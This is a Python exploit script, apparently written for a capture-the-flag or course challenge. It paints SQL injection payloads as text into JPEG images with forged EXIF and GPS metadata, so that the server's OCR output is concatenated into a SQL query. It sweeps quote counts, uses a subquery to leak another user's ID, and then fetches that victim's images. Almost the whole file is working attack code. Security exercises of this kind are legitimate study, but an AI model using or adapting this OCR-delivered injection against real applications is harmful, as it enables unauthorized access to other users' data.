# v2_ocr_attack.py — fresh instance. Re-baseline user_id, then attack OCR SQLi properly.
# KEY INSIGHT: quote-parity changes status (odd->500, even->200) => summary_ocr IS concatenated
# into SQL. Earlier failures = doubled quotes became SQLite escapes. Strategy: build the payload
# with the OCR-delivery ratio in mind and sweep opening/closing quote counts, detecting EXECUTION
# (a foreign uuid appears) not just literal storage.
import requests, base64, re, sys
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"

# --- get our user_id from the index HTML ---
html = requests.get(BASE + "/").text
m = re.search(r'id="id_user"[^>]*value="([0-9a-fA-F-]{36})"', html)
if not m:
    m = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html)
UID = m.group(1)
print("MY user_id:", UID)

base_img = Image.open("paisaje.png").convert("RGB")
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bbox=d.textbbox((20,20),text,font=f)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0))
    img.save("atk.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"atk.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("atk.jpg","rb").read()).decode()

def upload(painted, desc):
    uri = build(painted)
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return r.status_code

def read_ocr(desc):
    data = requests.get(f"{BASE}/images/{UID}").json()
    row = next((x for x in data if x.get("description")==desc), None)
    return (row.get("summary_ocr","") if row else None)

q="'"
SUB="(SELECT user_id FROM images WHERE id=1)"

print("\n=== sweep opening(a) x closing(b) quote counts on the real payload ===")
found=None
for a in range(1,6):
    for b in range(1,6):
        painted = q*a + "||" + SUB + "||" + q*b
        desc = f"V2_{a}_{b}"
        sc = upload(painted, desc)
        note=f"a={a} b={b} -> {sc}"
        if sc==200:
            ocr = read_ocr(desc) or ""
            leak=[u for u in UURE.findall(str(ocr)) if u!=UID]
            note += f"  ocr={ocr!r}"
            if leak:
                note += f"   >>> VICTIM {leak}"; found=leak[0]
        print(note)
        if found: break
    if found: break

if found:
    print("\n================ VICTIM user_id:", found, "================")
    print("Reading victim images...")
    vdata = requests.get(f"{BASE}/images/{found}").json()
    for im in vdata:
        print(f"  id={im.get('id')} desc={im.get('description')!r} ocr={im.get('summary_ocr')!r} file={im.get('filename')}")
else:
    print("\nno execution across a,b in 1..5 — need finer calibration; share output")
